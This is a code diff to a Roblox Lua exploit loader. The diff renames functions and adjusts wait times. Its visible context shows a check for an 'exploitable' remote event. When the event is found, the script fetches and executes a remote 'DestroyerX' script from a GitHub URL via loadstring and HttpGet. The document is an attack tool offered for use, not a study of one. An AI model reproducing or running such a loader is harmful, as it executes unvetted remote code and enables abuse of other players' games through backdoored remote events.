@@ -59,7 +59,7 @@ Icon.Image = "rbxassetid://7072725342"
 
 UIAspectRatioConstraint.Parent = Icon
 
-local function BJOJV_fake_script() -- check.check_script 
+local function UMNST_fake_script() -- check.check_script 
 	local script = Instance.new('LocalScript', check)
 
 	function exploitable()
@@ -103,7 +103,7 @@ local function BJOJV_fake_script() -- check.check_script
 		end
 		script.Parent.TextColor3 = Color3.fromRGB(48, 255, 72)
 		typewrite(textlabel,"Remote Event Found")
-		wait(1.9)
+		wait(1.85)
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/MrRonak2/DestroyerX/main/ScriptV2.lua",true))()
 		script.Parent.Parent.Parent:Destroy()
 	else
@@ -116,13 +116,13 @@ local function BJOJV_fake_script() -- check.check_script
 		end
 		script.Parent.TextColor3 = Color3.fromRGB(255, 0, 4)
 		typewrite(textlabel,"Remote Event Not Found")
-		wait(1.9)
+		wait(1.85)
 		script.Parent.Parent.Parent:Destroy()
 	end
 	
 end
-coroutine.wrap(BJOJV_fake_script)()
-local function BNPMT_fake_script() -- Icon.exit_script 
+coroutine.wrap(UMNST_fake_script)()
+local function HQRRW_fake_script() -- Icon.exit_script 
 	local script = Instance.new('LocalScript', Icon)
 
 	local loader = script.Parent.Parent.Parent
@@ -132,10 +132,4 @@ local function BNPMT_fake_script() -- Icon.exit_script
 	
 	script.Parent.MouseButton1Click:Connect(exit)
 end
-coroutine.wrap(BNPMT_fake_script)()
-local function QKCSUZ_fake_script() -- main.LocalScript 
-	local script = Instance.new('LocalScript', main)
-
-	
-end
-coroutine.wrap(QKCSUZ_fake_script)()
+coroutine.wrap(HQRRW_fake_script)()
